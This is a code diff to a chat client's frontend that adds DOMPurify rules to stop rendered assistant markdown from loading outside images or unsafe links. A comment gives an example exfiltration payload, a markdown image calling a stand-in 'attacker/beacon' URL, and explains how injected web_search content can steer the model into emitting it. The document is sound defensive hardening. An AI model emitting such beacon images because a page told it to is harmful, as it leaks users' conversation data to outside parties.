@@ -151,6 +151,64 @@ marked.use({
     },
 });
 
+// Rendered markdown is untrusted (model output incorporates web_search
+// content): a grounded page can make the model emit
+// ![x](https://attacker/beacon?d=...), which the browser fetches on render.
+// The hook is registered once, for every DOMPurify.sanitize call (only
+// addMessage's, which also passes SANITIZE_OPTS).
+//   <img>: src kept only for same-origin /plots/... or data:image/(png|jpeg|
+//          gif|webp);base64; otherwise the img becomes its alt text. A kept
+//          src is left byte-identical (the lightbox, export, and CSS select on
+//          img[src^='/plots']).
+//   <a>:   href kept for http(s), mailto, and same-origin relative links
+//          (http(s) ones open in a new tab with noopener noreferrer);
+//          otherwise the href is removed and the link text stays.
+//   other: src/href dropped on every other element (<source>, <input
+//          type=image>, <video>, ...), SANITIZE_OPTS forbids the other
+//          fetching attributes (srcset, poster, background, inline style
+//          url(), ...) and the <style>/<svg>/<math> subtrees.
+// Checks run on the value with whitespace/control chars stripped, as the
+// browser's URL parser would ("java\tscript:", " //host").
+const SAFE_IMG_DATA_RE = /^data:image\/(png|jpeg|gif|webp);base64,/i;
+const URL_SCHEME_RE = /^[a-z][a-z0-9+.-]*:/i;
+const SANITIZE_OPTS = {
+    FORBID_TAGS: ["style", "svg", "math"],
+    FORBID_ATTR: ["srcset", "poster", "background", "style", "xlink:href", "ping", "action", "formaction"],
+};
+
+function normalizeUrlAttr(value) {
+    return (value || "").replace(/[\u0000- \u007f]/g, "");
+}
+
+function isSafeImgSrc(value) {
+    const v = normalizeUrlAttr(value);
+    return (v.startsWith("/plots/") && !v.includes("\\")) || SAFE_IMG_DATA_RE.test(v);
+}
+
+function isSameOriginRelative(v) {
+    return !URL_SCHEME_RE.test(v) && !v.startsWith("//") && !v.includes("\\");
+}
+
+DOMPurify.addHook("afterSanitizeAttributes", (node) => {
+    if (node.tagName === "IMG") {
+        if (!isSafeImgSrc(node.getAttribute("src"))) {
+            node.replaceWith(document.createTextNode(node.getAttribute("alt") || ""));
+        }
+    } else if (node.tagName === "A") {
+        if (!node.hasAttribute("href")) return;
+        const href = normalizeUrlAttr(node.getAttribute("href"));
+        if (/^https?:/i.test(href)) {
+            node.setAttribute("target", "_blank");
+            node.setAttribute("rel", "noopener noreferrer");
+        } else if (!/^mailto:/i.test(href) && !isSameOriginRelative(href)) {
+            node.removeAttribute("href");
+        }
+    } else if (node.nodeType === Node.ELEMENT_NODE) {
+        node.removeAttribute("src");
+        node.removeAttribute("href");
+    }
+});
+
 function showLogin() {
     loginView.hidden = false;
     chatView.hidden = true;
@@ -169,7 +227,7 @@ function addMessage(role, content, imageDataUrl, model) {
     if (role === "assistant") {
         // Sanitize: model output incorporates web_search content, so rendered
         // markdown is untrusted — strip scripts/event handlers before insertion.
-        div.innerHTML = DOMPurify.sanitize(marked.parse(content));
+        div.innerHTML = DOMPurify.sanitize(marked.parse(content), SANITIZE_OPTS);
         div.querySelectorAll("pre code").forEach(el => hljs.highlightElement(el));
         div.querySelectorAll("pre").forEach(pre => {
             pre.style.position = "relative";
